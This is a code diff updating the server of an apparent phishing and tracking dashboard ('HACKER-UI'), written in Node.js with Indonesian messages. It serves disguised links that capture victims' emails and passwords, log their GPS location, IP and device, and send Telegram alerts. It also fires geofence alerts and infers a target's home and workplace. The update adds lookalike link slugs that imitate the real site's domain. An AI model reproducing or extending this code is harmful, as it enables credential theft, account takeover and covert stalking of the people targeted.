@@ -1,4 +1,4 @@
-// File: server.js (v8.0 - Filter & Geofencing Edition)
+// File: server.js (v9.0 - Smart Slug & Stability)
 
 require('dotenv').config();
 
@@ -10,7 +10,7 @@ const { nanoid } = require('nanoid');
 const fs = require('fs');
 const path = require('path');
 const cors = require('cors');
-const db = require('./db');
+const db = require('./db'); // PASTIKAN ANDA MENGGUNAKAN db.js DENGAN createPool
 const requestIp = require('request-ip');
 const axios = require('axios');
 const bcrypt = require('bcrypt');
@@ -65,14 +65,14 @@ const broadcastDashboardUpdate = async (socket = null) => {
                 FROM locations
             ) AS last_loc ON l.id = last_loc.tracker_id AND last_loc.rn = 1 
             ORDER BY l.created_at DESC`;
-        const [links] = await db.promise().query(linksQuery);
+        const [links] = await db.query(linksQuery);
         const statsQuery = `
             SELECT 
                 (SELECT COUNT(*) FROM links) as total_links, 
                 (SELECT SUM(click_count) FROM links) as total_clicks, 
                 (SELECT COUNT(*) FROM locations) as total_locations`;
-        const [stats] = await db.promise().query(statsQuery);
-        const [locations] = await db.promise().query(`SELECT user_agent FROM locations`);
+        const [stats] = await db.query(statsQuery);
+        const [locations] = await db.query(`SELECT user_agent FROM locations`);
         const parser = new UAParser();
         const browserStats = locations.reduce((acc, loc) => {
             if (loc.user_agent) {
@@ -90,7 +90,7 @@ const broadcastDashboardUpdate = async (socket = null) => {
             JOIN links l ON c.tracker_id = l.id 
             JOIN users u ON l.user_id = u.id 
             ORDER BY c.created_at DESC`;
-        const [credentials] = await db.promise().query(credentialsQuery);
+        const [credentials] = await db.query(credentialsQuery);
         const data = { links, stats: stats[0], browserStats, credentials };
         const emitter = socket || io;
         emitter.emit('dashboard_update', data);
@@ -111,10 +111,7 @@ io.on('connection', (socket) => {
             const token = payload.token;
             if (!token) return;
             jwt.verify(token, JWT_SECRET, (err, decoded) => {
-                if (err) {
-                    console.log('🔒 Token tidak valid dari klien soket.');
-                    return;
-                }
+                if (err) { return; }
                 console.log(`✅ Klien terotentikasi (${decoded.username}), mengirim data awal.`);
                 broadcastDashboardUpdate(socket);
             });
@@ -134,7 +131,7 @@ app.get('/', (req, res) => {
 app.post('/login', async (req, res) => {
     const { username, password } = req.body;
     try {
-        const [users] = await db.promise().query('SELECT * FROM users WHERE username = ? AND is_admin = TRUE', [username]);
+        const [users] = await db.query('SELECT * FROM users WHERE username = ? AND is_admin = TRUE', [username]);
         if (users.length === 0) {
             return res.status(401).json({ message: 'Username atau password salah.' });
         }
@@ -153,16 +150,11 @@ app.post('/login', async (req, res) => {
 
 app.get('/:id', async (req, res) => {
     const { id } = req.params;
-    
     try {
-        const [links] = await db.promise().query(`SELECT l.*, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
-        
+        const [links] = await db.query(`SELECT l.*, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
         if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
-        
         const linkData = links[0];
-        
         if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
-        
         let destinationUrl = linkData.original_url;
         io.emit('link_clicked', { username: linkData.username });
         let templatePath = '';
@@ -177,11 +169,9 @@ app.get('/:id', async (req, res) => {
             if (linkData.og_description) ogTags += `<meta property="og:description" content="${linkData.og_description.replace(/"/g, '"')}">\n`;
             if (linkData.og_image) ogTags += `<meta property="og:image" content="${linkData.og_image}">\n`;
             let html = data.replace('</head>', ogTags + '</head>');
-            
             html = html.replace(/{{DESTINATION_URL}}/g, destinationUrl)
-                       .replace(/{{TRACKER_ID}}/g, id)
-                       .replace(/{{USERNAME}}/g, linkData.username);
-            
+                .replace(/{{TRACKER_ID}}/g, id)
+                .replace(/{{USERNAME}}/g, linkData.username);
             if (linkData.link_type === 'iframe') {
                 let pageTitle = linkData.og_title || 'Loading...';
                 html = html.replace(/{{PAGE_TITLE}}/g, pageTitle);
@@ -196,7 +186,7 @@ app.get('/:id', async (req, res) => {
 
 const haversineDistance = (coords1, coords2) => {
     function toRad(x) { return x * Math.PI / 180; }
-    const R = 6371e3; 
+    const R = 6371e3;
     const dLat = toRad(coords2.lat - coords1.lat);
     const dLon = toRad(coords2.lon - coords1.lon);
     const lat1 = toRad(coords1.lat);
@@ -208,7 +198,7 @@ const haversineDistance = (coords1, coords2) => {
 
 async function checkGeofences(locationData) {
     try {
-        const [fences] = await db.promise().query('SELECT * FROM geofences');
+        const [fences] = await db.query('SELECT * FROM geofences');
         for (const fence of fences) {
             const distance = haversineDistance(
                 { lat: locationData.latitude, lon: locationData.longitude },
@@ -242,7 +232,7 @@ app.post('/log', async (req, res) => {
     const userAgentString = req.headers['user-agent'];
     const ipAddress = req.clientIp;
     try {
-        const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
+        const [users] = await db.query('SELECT id FROM users WHERE username = ?', [username]);
         if (users.length === 0) return res.status(404).json({ status: 'error', message: 'User not found' });
         
         let country = null, city = null, isp = null, org = null, proxy = false;
@@ -269,9 +259,8 @@ app.post('/log', async (req, res) => {
         }
         
         const newLocation = { user_id: users[0].id, tracker_id: trackerId, latitude, longitude, ip_address: ipAddress, user_agent: userAgentString, country, city, isp, org, proxy };
-        await db.promise().query('INSERT INTO locations SET ?', newLocation);
-
-        await db.promise().query("UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", [trackerId]);
+        await db.query('INSERT INTO locations SET ?', newLocation);
+        await db.query("UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", [trackerId]);
         
         const parser = new UAParser(userAgentString);
         const ua = parser.getResult();
@@ -279,7 +268,7 @@ app.post('/log', async (req, res) => {
         const osInfo = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
         
         broadcastLogMessage(`> Location from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
-
+        
         const telegramMessage = `
 *💀 Target Terdeteksi! 💀*
 *Target ID:* \`${username}\`
@@ -287,7 +276,7 @@ app.post('/log', async (req, res) => {
 *Lokasi:* ${city || 'N/A'}, ${country || 'N/A'}
 *Provider:* ${isp || 'N/A'}
 *Perangkat:* ${browserInfo} pada ${osInfo}
-*Lihat di Peta:* [Google Maps](http://googleusercontent.com/maps/google.com/9{latitude},${longitude})`;
+*Lihat di Peta:* [Google Maps](http://maps.google.com/maps?q=${latitude},${longitude})`;
         await sendTelegramNotification(telegramMessage);
 
         const newLocationDataForMap = { ...newLocation, username, created_at: new Date() };
@@ -310,8 +299,8 @@ app.post('/api/credentials', async (req, res) => {
     
     broadcastLogMessage(`> Kredensial ditangkap dari link [${trackerId}] | Email: ${email} | IP: ${ipAddress}`);
     try {
-        await db.promise().query('INSERT INTO credentials (tracker_id, email, password, ip_address) VALUES (?, ?, ?, ?)', [trackerId, email, password, ipAddress]);
-        const [rows] = await db.promise().query('SELECT u.username FROM users u JOIN links l ON u.id = l.user_id WHERE l.id = ?', [trackerId]);
+        await db.query('INSERT INTO credentials (tracker_id, email, password, ip_address) VALUES (?, ?, ?, ?)', [trackerId, email, password, ipAddress]);
+        const [rows] = await db.query('SELECT u.username FROM users u JOIN links l ON u.id = l.user_id WHERE l.id = ?', [trackerId]);
         if (rows.length > 0) {
             const username = rows[0].username;
             const message = `
@@ -334,8 +323,8 @@ app.post('/api/credentials', async (req, res) => {
 
 app.post('/create', protectRoute, async (req, res) => {
     const { username, originalUrl, url_android, url_ios, expiresIn, linkType } = req.body;
-    
     if (!username || !originalUrl) return res.status(400).json({ error: 'Data tidak lengkap' });
+
     let ogData = { og_title: null, og_description: null, og_image: null };
     try {
         const response = await axios.get(originalUrl, { headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' } });
@@ -357,36 +346,64 @@ app.post('/create', protectRoute, async (req, res) => {
         expiresAt = new Date();
         expiresAt.setHours(expiresAt.getHours() + parseInt(expiresIn));
     }
+
     try {
-        let [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
+        let [users] = await db.query('SELECT id FROM users WHERE username = ?', [username]);
         let userId;
         if (users.length > 0) {
             userId = users[0].id;
         } else {
-            const [result] = await db.promise().query('INSERT INTO users (username, is_admin) VALUES (?, FALSE) ON DUPLICATE KEY UPDATE id=LAST_INSERT_ID(id)', [username]);
+            const [result] = await db.query('INSERT INTO users (username, is_admin) VALUES (?, FALSE) ON DUPLICATE KEY UPDATE id=LAST_INSERT_ID(id)', [username]);
             userId = result.insertId;
         }
 
-        const id = nanoid(8);
+        // --- INI BAGIAN BARUNYA (FITUR LINK CERDAS) ---
+        let id;
+        try {
+            const url = new URL(originalUrl);
+            const domain = url.hostname.replace(/\./g, '․');
+            const titleSlug = (ogData.og_title || 'link')
+                .toLowerCase()
+                .replace(/[^a-z0-9\s-]/g, '')
+                .trim()
+                .replace(/\s+/g, '-')
+                .substring(0, 150);
+            
+            let fullSlug = `${domain}-${titleSlug}`;
+            if (fullSlug.length > 250) {
+                fullSlug = fullSlug.substring(0, 250);
+            }
+
+            const [existingLink] = await db.query('SELECT id FROM links WHERE id = ?', [fullSlug]);
+            if (existingLink.length > 0) {
+                id = `${fullSlug}-${nanoid(4)}`;
+            } else {
+                id = fullSlug;
+            }
+        } catch (e) {
+            console.warn("Gagal membuat slug dari URL, menggunakan nanoid sebagai fallback.");
+            id = nanoid(8);
+        }
+        // --- AKHIR BAGIAN BARU ---
+
         const newLinkData = { id, user_id: userId, original_url: originalUrl, url_android: url_android || null, url_ios: url_ios || null, expires_at: expiresAt, link_type: linkType || 'direct', ...ogData };
-        await db.promise().query('INSERT INTO links SET ?', newLinkData);
         
-        broadcastLogMessage(`> Link created for target [${username}] with ID [${id}]`);
+        await db.query('INSERT INTO links SET ?', newLinkData);
+        
+        broadcastLogMessage(`> Link cerdas dibuat untuk [${username}] dengan ID [${id}]`);
         broadcastDashboardUpdate();
         res.status(201).json({ newLink: `${req.protocol}://${req.get('host')}/${id}`, username });
     } catch (error) {
         console.error("Error creating link:", error);
-        res.status(500).json({ error: 'DB error' });
+        res.status(500).json({ error: 'DB error', message: error.sqlMessage || error.message });
     }
 });
 
 app.delete('/api/links/:id', protectRoute, async (req, res) => {
     const { id } = req.params;
     try {
-        await db.promise().query("DELETE FROM credentials WHERE tracker_id = ?", [id]);
-        await db.promise().query("DELETE FROM locations WHERE tracker_id = ?", [id]);
-        await db.promise().query("DELETE FROM links WHERE id = ?", [id]);
-        broadcastLogMessage(`> Link [${id}] and all its data have been deleted.`);
+        await db.query("DELETE FROM links WHERE id = ?", [id]); // ON DELETE CASCADE akan menangani sisanya
+        broadcastLogMessage(`> Link [${id}] dan semua data terkait telah dihapus.`);
         broadcastDashboardUpdate();
         res.json({ status: 'success', message: 'Link berhasil dihapus.' });
     } catch (error) {
@@ -398,7 +415,7 @@ app.delete('/api/links/:id', protectRoute, async (req, res) => {
 app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
     const { trackerId } = req.params;
     try {
-        const [locations] = await db.promise().query(`SELECT latitude, longitude, created_at, ip_address, user_agent, country, city, isp, org, proxy FROM locations WHERE tracker_id = ? ORDER BY created_at DESC`, [trackerId]);
+        const [locations] = await db.query(`SELECT latitude, longitude, created_at, ip_address, user_agent, country, city, isp, org, proxy FROM locations WHERE tracker_id = ? ORDER BY created_at DESC`, [trackerId]);
         const parser = new UAParser();
         const parsedLocations = locations.map(loc => {
             const ua = parser.setUA(loc.user_agent || '').getResult();
@@ -414,7 +431,7 @@ app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
 
 async function analyzeBehavioralPatterns(userId) {
     try {
-        const [locations] = await db.promise().query('SELECT latitude, longitude, created_at FROM locations WHERE user_id = ? ORDER BY created_at DESC', [userId]);
+        const [locations] = await db.query('SELECT latitude, longitude, created_at FROM locations WHERE user_id = ? ORDER BY created_at DESC', [userId]);
         if (locations.length < 10) { return { home: null, work: null, anomalies: [], message: 'Insufficient location data for analysis.' }; }
         const locationClusters = {};
         locations.forEach(loc => {
@@ -434,10 +451,10 @@ async function analyzeBehavioralPatterns(userId) {
                 if (day > 0 && day < 6 && hour >= 9 && hour <= 17) { workScore++; }
             });
             if (!potentialHome || homeScore > potentialHome.score) {
-                if(workScore < homeScore) { potentialHome = { ...cluster, score: homeScore }; }
+                if (workScore < homeScore) { potentialHome = { ...cluster, score: homeScore }; }
             }
             if (!potentialWork || workScore > potentialWork.score) {
-                 if(homeScore < workScore) { potentialWork = { ...cluster, score: workScore }; }
+                if (homeScore < workScore) { potentialWork = { ...cluster, score: workScore }; }
             }
         }
         if (potentialHome && potentialWork && potentialHome.lat.toFixed(3) === potentialWork.lat.toFixed(3)) {
@@ -466,7 +483,7 @@ async function analyzeBehavioralPatterns(userId) {
 app.get('/api/intel/:username', protectRoute, async (req, res) => {
     const { username } = req.params;
     try {
-        const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
+        const [users] = await db.query('SELECT id FROM users WHERE username = ?', [username]);
         if (users.length === 0) { return res.status(404).json({ error: 'Target user not found' }); }
         const userId = users[0].id;
         const analysisResult = await analyzeBehavioralPatterns(userId);
@@ -478,7 +495,7 @@ app.get('/api/intel/:username', protectRoute, async (req, res) => {
 
 app.get('/api/geofences', protectRoute, async (req, res) => {
     try {
-        const [fences] = await db.promise().query('SELECT * FROM geofences ORDER BY name ASC');
+        const [fences] = await db.query('SELECT * FROM geofences ORDER BY name ASC');
         res.json(fences);
     } catch (error) {
         res.status(500).json({ message: 'Failed to fetch geofences' });
@@ -487,11 +504,9 @@ app.get('/api/geofences', protectRoute, async (req, res) => {
 
 app.post('/api/geofences', protectRoute, async (req, res) => {
     const { name, lat, lon, radius } = req.body;
-    if (!name || !lat || !lon || !radius) {
-        return res.status(400).json({ message: 'All fields are required' });
-    }
+    if (!name || !lat || !lon || !radius) { return res.status(400).json({ message: 'All fields are required' }); }
     try {
-        await db.promise().query('INSERT INTO geofences (name, lat, lon, radius) VALUES (?, ?, ?, ?)', [name, lat, lon, radius]);
+        await db.query('INSERT INTO geofences (name, lat, lon, radius) VALUES (?, ?, ?, ?)', [name, lat, lon, radius]);
         res.status(201).json({ message: 'Geofence created' });
     } catch (error) {
         res.status(500).json({ message: 'Failed to create geofence' });
@@ -500,7 +515,7 @@ app.post('/api/geofences', protectRoute, async (req, res) => {
 
 app.delete('/api/geofences/:id', protectRoute, async (req, res) => {
     try {
-        await db.promise().query('DELETE FROM geofences WHERE id = ?', [req.params.id]);
+        await db.query('DELETE FROM geofences WHERE id = ?', [req.params.id]);
         res.json({ message: 'Geofence deleted' });
     } catch (error) {
         res.status(500).json({ message: 'Failed to delete geofence' });
@@ -525,7 +540,7 @@ app.get('/api/alldata/links', protectRoute, async (req, res) => {
         params.push(`${req.query.endDate} 23:59:59`);
     }
     query += " ORDER BY l.created_at DESC";
-    const [links] = await db.promise().query(query, params);
+    const [links] = await db.query(query, params);
     res.json(links);
 });
 
@@ -547,7 +562,7 @@ app.get('/api/alldata/locations', protectRoute, async (req, res) => {
         params.push(`${req.query.endDate} 23:59:59`);
     }
     query += " ORDER BY loc.created_at DESC";
-    const [locations] = await db.promise().query(query, params);
+    const [locations] = await db.query(query, params);
     res.json(locations);
 });
 
@@ -569,13 +584,13 @@ app.get('/api/alldata/credentials', protectRoute, async (req, res) => {
         params.push(`${req.query.endDate} 23:59:59`);
     }
     query += " ORDER BY cred.created_at DESC";
-    const [credentials] = await db.promise().query(query, params);
+    const [credentials] = await db.query(query, params);
     res.json(credentials);
 });
 
 app.delete('/api/alldata/location/:id', protectRoute, async (req, res) => {
     try {
-        await db.promise().query('DELETE FROM locations WHERE id = ?', [req.params.id]);
+        await db.query('DELETE FROM locations WHERE id = ?', [req.params.id]);
         res.json({ message: 'Location record deleted successfully.' });
     } catch (error) {
         res.status(500).json({ message: 'Failed to delete location record.' });
@@ -584,7 +599,7 @@ app.delete('/api/alldata/location/:id', protectRoute, async (req, res) => {
 
 app.delete('/api/alldata/credential/:id', protectRoute, async (req, res) => {
     try {
-        await db.promise().query('DELETE FROM credentials WHERE id = ?', [req.params.id]);
+        await db.query('DELETE FROM credentials WHERE id = ?', [req.params.id]);
         res.json({ message: 'Credential record deleted successfully.' });
     } catch (error) {
         res.status(500).json({ message: 'Failed to delete credential record.' });
@@ -592,8 +607,9 @@ app.delete('/api/alldata/credential/:id', protectRoute, async (req, res) => {
 });
 
 app.delete('/api/alldata/all', protectRoute, async (req, res) => {
-    const connection = db.promise(); 
+    let connection;
     try {
+        connection = await db.getConnection();
         await connection.beginTransaction();
         await connection.query('DELETE FROM credentials');
         await connection.query('DELETE FROM locations');
@@ -602,14 +618,16 @@ app.delete('/api/alldata/all', protectRoute, async (req, res) => {
         broadcastDashboardUpdate();
         res.json({ message: 'All tracking data has been wiped successfully.' });
     } catch (error) {
-        await connection.rollback();
+        if(connection) await connection.rollback();
         console.error("Error wiping all data:", error);
         res.status(500).json({ message: 'Failed to wipe all data.' });
+    } finally {
+        if(connection) connection.release();
     }
 });
 
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v8.0 (Filter & Geofencing)`);
+    console.log(`\n HACKER-UI DASHBOARD v9.0 (Smart Slug & Stability)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
